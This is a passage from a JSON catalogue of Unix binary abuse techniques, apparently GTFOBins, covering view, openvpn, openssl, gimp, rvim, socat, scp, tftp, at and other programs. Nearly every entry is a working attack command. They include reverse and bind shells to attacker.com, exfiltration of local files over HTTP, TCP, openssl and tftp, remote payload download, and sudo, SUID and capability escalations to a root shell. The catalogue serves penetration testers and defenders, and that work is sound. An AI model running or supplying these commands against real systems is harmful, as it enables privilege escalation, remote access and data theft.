b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}]}, "533": {"platform": "linux", "cmd": "view", "function": "file-upload", "data": [{"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"}, {"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nview -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}]}, "534": {"platform": "linux", "cmd": "view", "function": "file-download", "data": [{"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nview -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `view` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nview -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}]}, "535": {"platform": "linux", "cmd": "view", "function": "file-write", "data": [{"code": "view file_to_write\niDATA\n^[\nw!\n"}]}, "536": {"platform": "linux", "cmd": "view", "function": "file-read", "data": [{"code": "view file_to_read"}]}, "537": {"platform": "linux", "cmd": "view", "function": "library-load", "data": [{"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "view -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}]}, "538": {"platform": "linux", "cmd": "view", "function": "suid", "data": [{"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}]}, "539": {"platform": "linux", "cmd": "view", "function": "sudo", "data": [{"code": "sudo view -c ':!/bin/sh'"}, {"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "sudo view -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `view` is compiled with Lua support.", "code": "sudo view -c ':lua os.execute(\"reset; exec sh\")'"}]}, "540": {"platform": "linux", "cmd": "view", "function": "capabilities", "data": [{"description": "This requires that `view` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./view -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}]}, "541": {"platform": "linux", "cmd": "view", "function": "limited-suid", "data": [{"description": "This requires that `view` is compiled with Lua support.", "code": "./view -c ':lua os.execute(\"reset; exec sh\")'"}]}, "542": {"platform": "linux", "cmd": "openvpn", "function": "shell", "data": [{"code": "openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"}]}, "543": {"platform": "linux", "cmd": "openvpn", "function": "file-read", "data": [{"description": "The file is actually parsed and the first partial wrong line is returned in an error message.", "code": "LFILE=file_to_read\nopenvpn --config \"$LFILE\"\n"}]}, "544": {"platform": "linux", "cmd": "openvpn", "function": "suid", "data": [{"code": "./openvpn --dev null --script-security 2 --up '/bin/sh -p -c \"sh -p\"'\n"}, {"description": "The file is actually parsed and the first partial wrong line is returned in an error message.", "code": "LFILE=file_to_read\n./openvpn --config \"$LFILE\"\n"}]}, "545": {"platform": "linux", "cmd": "openvpn", "function": "sudo", "data": [{"code": "sudo openvpn --dev null --script-security 2 --up '/bin/sh -c sh'\n"}, {"description": "The file is actually parsed and the first partial wrong line is returned in an error message.", "code": "LFILE=file_to_read\nsudo openvpn --config \"$LFILE\"\n"}]}, "546": {"platform": "linux", "cmd": "openssl", "function": "reverse-shell", "data": [{"description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"}]}, "547": {"platform": "linux", "cmd": "openssl", "function": "file-upload", "data": [{"description": "To collect the file run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 > file_to_save\n\nSend a local file via TCP. Transmission will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nopenssl s_client -quiet -connect $RHOST:$RPORT < \"$LFILE\"\n"}]}, "548": {"platform": "linux", "cmd": "openssl", "function": "file-download", "data": [{"description": "To send the file run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345 < file_to_send\n\nFetch a file from a TCP port, transmission will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nopenssl s_client -quiet -connect $RHOST:$RPORT > \"$LFILE\"\n"}]}, "549": {"platform": "linux", "cmd": "openssl", "function": "file-write", "data": [{"code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"}, {"code": "LFILE=file_to_write\nTF=$(mktemp)\necho \"DATA\" > $TF\nopenssl enc -in \"$TF\" -out \"$LFILE\"\n"}]}, "550": {"platform": "linux", "cmd": "openssl", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nopenssl enc -in \"$LFILE\"\n"}]}, "551": {"platform": "linux", "cmd": "openssl", "function": "suid", "data": [{"description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | ./openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"}, {"code": "LFILE=file_to_write\necho DATA | openssl enc -out \"$LFILE\"\n"}]}, "552": {"platform": "linux", "cmd": "openssl", "function": "sudo", "data": [{"description": "To receive the shell run the following on the attacker box:\n\n    openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes\n    openssl s_server -quiet -key key.pem -cert cert.pem -port 12345\n\nCommunication between attacker and target will be encrypted.\n", "code": "RHOST=attacker.com\nRPORT=12345\nmkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect $RHOST:$RPORT > /tmp/s; rm /tmp/s\n"}]}, "553": {"platform": "linux", "cmd": "openssl", "function": "library-load", "data": [{"code": "openssl req -engine ./lib.so"}]}, "554": {"platform": "linux", "cmd": "script", "function": "shell", "data": [{"code": "script -q /dev/null"}]}, "555": {"platform": "linux", "cmd": "script", "function": "sudo", "data": [{"code": "sudo script -q /dev/null"}]}, "556": {"platform": "linux", "cmd": "script", "function": "file-write", "data": [{"description": "The wrote content is corrupted by debug prints.", "code": "script -q -c 'echo DATA' file_to_write"}]}, "557": {"platform": "linux", "cmd": "run-mailcap", "function": "shell", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "run-mailcap --action=view /etc/hosts\n!/bin/sh\n"}]}, "558": {"platform": "linux", "cmd": "run-mailcap", "function": "file-read", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "run-mailcap --action=view file_to_read"}]}, "559": {"platform": "linux", "cmd": "run-mailcap", "function": "file-write", "data": [{"description": "The file must exist and be not empty.\n\nThis invokes the default editor, which is likely to be [`vi`](/gtfobins/vi/), other functions may apply.\n", "code": "run-mailcap --action=edit file_to_read"}]}, "560": {"platform": "linux", "cmd": "run-mailcap", "function": "sudo", "data": [{"description": "This invokes the default pager, which is likely to be [`less`](/gtfobins/less/), other functions may apply.", "code": "sudo run-mailcap --action=view /etc/hosts\n!/bin/sh\n"}]}, "561": {"platform": "linux", "cmd": "gimp", "function": "shell", "data": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"}]}, "562": {"platform": "linux", "cmd": "gimp", "function": "reverse-shell", "data": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")'\n"}]}, "563": {"platform": "linux", "cmd": "gimp", "function": "file-upload", "data": [{"description": "Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))'\n"}, {"description": "Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()'\n"}]}, "564": {"platform": "linux", "cmd": "gimp", "function": "file-download", "data": [{"description": "Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\ngimp -idf --batch-interpreter=python-fu-eval -b 'import sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])'\n"}]}, "565": {"platform": "linux", "cmd": "gimp", "function": "file-write", "data": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b 'open(\"file_to_write\", \"wb\").write(\"DATA\")'\n"}]}, "566": {"platform": "linux", "cmd": "gimp", "function": "file-read", "data": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b 'print(open(\"file_to_read\").read())'"}]}, "567": {"platform": "linux", "cmd": "gimp", "function": "library-load", "data": [{"code": "gimp -idf --batch-interpreter=python-fu-eval -b 'from ctypes import cdll; cdll.LoadLibrary(\"lib.so\")'"}]}, "568": {"platform": "linux", "cmd": "gimp", "function": "suid", "data": [{"code": "./gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'"}]}, "569": {"platform": "linux", "cmd": "gimp", "function": "sudo", "data": [{"code": "sudo gimp -idf --batch-interpreter=python-fu-eval -b 'import os; os.system(\"sh\")'"}]}, "570": {"platform": "linux", "cmd": "psql", "function": "shell", "data": [{"code": "psql\n\\?\n!/bin/sh\n"}]}, "571": {"platform": "linux", "cmd": "psql", "function": "sudo", "data": [{"code": "psql\n\\?\n!/bin/sh\n"}]}, "572": {"platform": "linux", "cmd": "zsh", "function": "file-read", "data": [{"code": "export LFILE=file_to_read\nzsh -c 'echo \"$(<$LFILE)\"'\n"}]}, "573": {"platform": "linux", "cmd": "zsh", "function": "file-write", "data": [{"code": "export LFILE=file_to_write\nzsh -c 'echo DATA >$LFILE'\n"}]}, "574": {"platform": "linux", "cmd": "zsh", "function": "shell", "data": [{"code": "zsh"}]}, "575": {"platform": "linux", "cmd": "zsh", "function": "suid", "data": [{"code": "./zsh"}]}, "576": {"platform": "linux", "cmd": "zsh", "function": "sudo", "data": [{"code": "sudo zsh"}]}, "577": {"platform": "linux", "cmd": "rvim", "function": "shell", "data": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `rvim` is compiled with Lua support.", "code": "rvim -c ':lua os.execute(\"reset; exec sh\")'"}]}, "578": {"platform": "linux", "cmd": "rvim", "function": "reverse-shell", "data": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'\n"}]}, "579": {"platform": "linux", "cmd": "rvim", "function": "non-interactive-reverse-shell", "data": [{"description": "Run ``nc -l -p 12345`` on the attacker box to receive the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nrvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'\n"}]}, "580": {"platform": "linux", "cmd": "rvim", "function": "non-interactive-bind-shell", "data": [{"description": "Run `nc target.com 12345` on the attacker box to connect to the shell. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'\n"}]}, "581": {"platform": "linux", "cmd": "rvim", "function": "file-upload", "data": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Send local file via \"d\" parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.", "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'\n"}, {"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Serve files in the local folder running an HTTP server.", "code": "export LPORT=8888\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'\n"}, {"description": "Send a local file via TCP. Run `nc -l -p 12345 > \"file_to_save\"` on the attacker box to collect the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nrvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'\n"}]}, "582": {"platform": "linux", "cmd": "rvim", "function": "file-download", "data": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3. Fetch a remote file via HTTP GET request.", "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nrvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'\n"}, {"description": "Fetch a remote file via TCP. Run `nc target.com 12345 < \"file_to_send\"` on the attacker box to send the file. This requires that `rvim` is compiled with Lua support and that `lua-socket` is installed.", "code": "export LPORT=12345\nexport LFILE=file_to_save\nrvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'\n"}]}, "583": {"platform": "linux", "cmd": "rvim", "function": "file-write", "data": [{"code": "rvim file_to_write\niDATA\n^[\nw\n"}]}, "584": {"platform": "linux", "cmd": "rvim", "function": "file-read", "data": [{"code": "rvim file_to_read"}]}, "585": {"platform": "linux", "cmd": "rvim", "function": "library-load", "data": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "rvim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"}]}, "586": {"platform": "linux", "cmd": "rvim", "function": "suid", "data": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"}]}, "587": {"platform": "linux", "cmd": "rvim", "function": "sudo", "data": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "sudo rvim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}, {"description": "This requires that `rvim` is compiled with Lua support.", "code": "sudo rvim -c ':lua os.execute(\"reset; exec sh\")'"}]}, "588": {"platform": "linux", "cmd": "rvim", "function": "capabilities", "data": [{"description": "This requires that `rvim` is compiled with Python support. Prepend `:py3` for Python 3.", "code": "./rvim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"}]}, "589": {"platform": "linux", "cmd": "rvim", "function": "limited-suid", "data": [{"description": "This requires that `rvim` is compiled with Lua support.", "code": "./rvim -c ':lua os.execute(\"reset; exec sh\")'"}]}, "590": {"platform": "linux", "cmd": "xmore", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nxmore $LFILE\n"}]}, "591": {"platform": "linux", "cmd": "xmore", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./xmore $LFILE\n"}]}, "592": {"platform": "linux", "cmd": "xmore", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo xmore $LFILE\n"}]}, "593": {"platform": "linux", "cmd": "unexpand", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nunexpand -t99999999 \"$LFILE\"\n"}]}, "594": {"platform": "linux", "cmd": "unexpand", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./unexpand -t99999999 \"$LFILE\"\n"}]}, "595": {"platform": "linux", "cmd": "unexpand", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo unexpand -t99999999 \"$LFILE\"\n"}]}, "596": {"platform": "linux", "cmd": "rev", "function": "file-read", "data": [{"code": "LFILE=file_to_read\nrev $LFILE | rev\n"}]}, "597": {"platform": "linux", "cmd": "rev", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./rev $LFILE | rev\n"}]}, "598": {"platform": "linux", "cmd": "rev", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo rev $LFILE | rev\n"}]}, "599": {"platform": "linux", "cmd": "socat", "function": "shell", "data": [{"description": "The resulting shell is not a proper TTY shell and lacks the prompt.", "code": "socat stdin exec:/bin/sh\n"}]}, "600": {"platform": "linux", "cmd": "socat", "function": "reverse-shell", "data": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\nsocat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n"}]}, "601": {"platform": "linux", "cmd": "socat", "function": "bind-shell", "data": [{"description": "Run ``socat FILE:`tty`,raw,echo=0 TCP:target.com:12345`` on the attacker box to connect to the shell.", "code": "LPORT=12345\nsocat TCP-LISTEN:$LPORT,reuseaddr,fork EXEC:/bin/sh,pty,stderr,setsid,sigint,sane\n"}]}, "602": {"platform": "linux", "cmd": "socat", "function": "file-upload", "data": [{"description": "Run ``socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat`` on the attacker box to collect the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nsocat -u file:$LFILE tcp-connect:$RHOST:$RPORT\n"}]}, "603": {"platform": "linux", "cmd": "socat", "function": "file-download", "data": [{"description": "Run ``socat -u file:file_to_send tcp-listen:12345,reuseaddr`` on the attacker box to send the file.", "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nsocat -u tcp-connect:$RHOST:$RPORT open:$LFILE,creat\n"}]}, "604": {"platform": "linux", "cmd": "socat", "function": "sudo", "data": [{"description": "The resulting shell is not a proper TTY shell and lacks the prompt.", "code": "sudo socat stdin exec:/bin/sh\n"}]}, "605": {"platform": "linux", "cmd": "socat", "function": "limited-suid", "data": [{"description": "Run ``socat file:`tty`,raw,echo=0 tcp-listen:12345`` on the attacker box to receive the shell.", "code": "RHOST=attacker.com\nRPORT=12345\n./socat tcp-connect:$RHOST:$RPORT exec:/bin/sh,pty,stderr,setsid,sigint,sane\n"}]}, "606": {"platform": "linux", "cmd": "ionice", "function": "shell", "data": [{"code": "ionice /bin/sh"}]}, "607": {"platform": "linux", "cmd": "ionice", "function": "suid", "data": [{"code": "./ionice /bin/sh -p"}]}, "608": {"platform": "linux", "cmd": "ionice", "function": "sudo", "data": [{"code": "sudo ionice /bin/sh"}]}, "609": {"platform": "linux", "cmd": "pdb", "function": "shell", "data": [{"code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\npdb $TF\ncont\n"}]}, "610": {"platform": "linux", "cmd": "pdb", "function": "sudo", "data": [{"code": "TF=$(mktemp)\necho 'import os; os.system(\"/bin/sh\")' > $TF\nsudo pdb $TF\ncont\n"}]}, "611": {"platform": "linux", "cmd": "dvips", "function": "shell", "data": [{"code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\ndvips -R0 texput.dvi\n"}]}, "612": {"platform": "linux", "cmd": "dvips", "function": "sudo", "data": [{"code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\nsudo dvips -R0 texput.dvi\n"}]}, "613": {"platform": "linux", "cmd": "dvips", "function": "limited-suid", "data": [{"code": "tex '\\special{psfile=\"`/bin/sh 1>&0\"}\\end'\n./dvips -R0 texput.dvi\n"}]}, "614": {"platform": "linux", "cmd": "scp", "function": "shell", "data": [{"code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nscp -S $TF x y:\n"}]}, "615": {"platform": "linux", "cmd": "scp", "function": "file-upload", "data": [{"description": "Send local file to a SSH server.", "code": "RPATH=user@attacker.com:~/file_to_save\nLPATH=file_to_send\nscp $LFILE $RPATH\n"}]}, "616": {"platform": "linux", "cmd": "scp", "function": "file-download", "data": [{"description": "Fetch a remote file from a SSH server.", "code": "RPATH=user@attacker.com:~/file_to_get\nLFILE=file_to_save\nscp $RPATH $LFILE\n"}]}, "617": {"platform": "linux", "cmd": "scp", "function": "sudo", "data": [{"code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\nsudo scp -S $TF x y:\n"}]}, "618": {"platform": "linux", "cmd": "scp", "function": "limited-suid", "data": [{"code": "TF=$(mktemp)\necho 'sh 0<&2 1>&2' > $TF\nchmod +x \"$TF\"\n./scp -S $TF a b:\n"}]}, "619": {"platform": "linux", "cmd": "tftp", "function": "file-upload", "data": [{"description": "Send local file to a TFTP server.", "code": "RHOST=attacker.com\ntftp $RHOST\nput file_to_send\n"}]}, "620": {"platform": "linux", "cmd": "tftp", "function": "file-download", "data": [{"description": "Fetch a remote file from a TFTP server.", "code": "RHOST=attacker.com\ntftp $RHOST\nget file_to_get\n"}]}, "621": {"platform": "linux", "cmd": "tftp", "function": "suid", "data": [{"description": "Send local file to a TFTP server.", "code": "RHOST=attacker.com\n./tftp $RHOST\nput file_to_send\n"}]}, "622": {"platform": "linux", "cmd": "tftp", "function": "sudo", "data": [{"description": "Send local file to a TFTP server.", "code": "RHOST=attacker.com\nsudo tftp $RHOST\nput file_to_send\n"}]}, "623": {"platform": "linux", "cmd": "octave", "function": "shell", "data": [{"code": "octave-cli --eval 'system(\"/bin/sh\")'"}]}, "624": {"platform": "linux", "cmd": "octave", "function": "file-write", "data": [{"code": "octave-cli --eval 'filename = \"file_to_write\"; fid = fopen(filename, \"w\"); fputs(fid, \"DATA\"); fclose(fid);'"}]}, "625": {"platform": "linux", "cmd": "octave", "function": "file-read", "data": [{"code": "octave-cli --eval 'format none; fid = fopen(\"file_to_read\"); while(!feof(fid)); txt = fgetl(fid); disp(txt); endwhile; fclose(fid);'"}]}, "626": {"platform": "linux", "cmd": "octave", "function": "sudo", "data": [{"code": "sudo octave-cli --eval 'system(\"/bin/sh\")'"}]}, "627": {"platform": "linux", "cmd": "octave", "function": "limited-suid", "data": [{"code": "./octave-cli --eval 'system(\"/bin/sh\")'"}]}, "628": {"platform": "linux", "cmd": "check_ssl_cert", "function": "command", "data": [{"description": "The host example.net must return a certificate via TLS", "code": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"}]}, "629": {"platform": "linux", "cmd": "check_ssl_cert", "function": "sudo", "data": [{"description": "The host example.net must return a certificate via TLS", "code": "COMMAND=id\nOUTPUT=output_file\nTF=$(mktemp)\necho \"$COMMAND | tee $OUTPUT\" > $TF\nchmod +x $TF\numask 022\ncheck_ssl_cert --curl-bin $TF -H example.net\ncat $OUTPUT\n"}]}, "630": {"platform": "linux", "cmd": "pry", "function": "shell", "data": [{"code": "pry\nsystem(\"/bin/sh\")\n"}]}, "631": {"platform": "linux", "cmd": "pry", "function": "sudo", "data": [{"code": "sudo pry\nsystem(\"/bin/sh\")\n"}]}, "632": {"platform": "linux", "cmd": "pry", "function": "limited-suid", "data": [{"code": "./pry\nsystem(\"/bin/sh\")\n"}]}, "633": {"platform": "linux", "cmd": "taskset", "function": "shell", "data": [{"code": "taskset 1 /bin/sh"}]}, "634": {"platform": "linux", "cmd": "taskset", "function": "suid", "data": [{"code": "./taskset 1 /bin/sh -p"}]}, "635": {"platform": "linux", "cmd": "taskset", "function": "sudo", "data": [{"code": "sudo taskset 1 /bin/sh"}]}, "636": {"platform": "linux", "cmd": "arp", "function": "file-read", "data": [{"code": "LFILE=file_to_read\narp -v -f \"$LFILE\"\n"}]}, "637": {"platform": "linux", "cmd": "arp", "function": "suid", "data": [{"code": "LFILE=file_to_read\n./arp -v -f \"$LFILE\"\n"}]}, "638": {"platform": "linux", "cmd": "arp", "function": "sudo", "data": [{"code": "LFILE=file_to_read\nsudo arp -v -f \"$LFILE\"\n"}]}, "639": {"platform": "linux", "cmd": "cpulimit", "function": "shell", "data": [{"code": "cpulimit -l 100 -f /bin/sh"}]}, "640": {"platform": "linux", "cmd": "cpulimit", "function": "suid", "data": [{"code": "./cpulimit -l 100 -f -- /bin/sh -p"}]}, "641": {"platform": "linux", "cmd": "cpulimit", "function": "sudo", "data": [{"code": "sudo cpulimit -l 100 -f /bin/sh"}]}, "642": {"platform": "linux", "cmd": "at", "function": "shell", "data": [{"code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | at now; tail -f /dev/null\n"}]}, "643": {"platform": "linux", "cmd": "at", "function": "command", "data": [{"description": "The invocation will be blind, but it is possible to redirect the output to a file in a readable location.", "code": "COMMAND=id\necho \"$COMMAND\" | at now\n"}]}, "644": {"platform": "linux", "cmd": "at", "function": "sudo", "data": [{"code": "echo \"/bin/sh <$(tty) >$(tty) 2>$(tty)\" | sudo at now; tail -f /dev/null\n"}]}, "645": {"platform": "linux", "cmd": "ldconfig", "function": "sudo", "data": [{"description": "This allows to override one or more shared libraries. 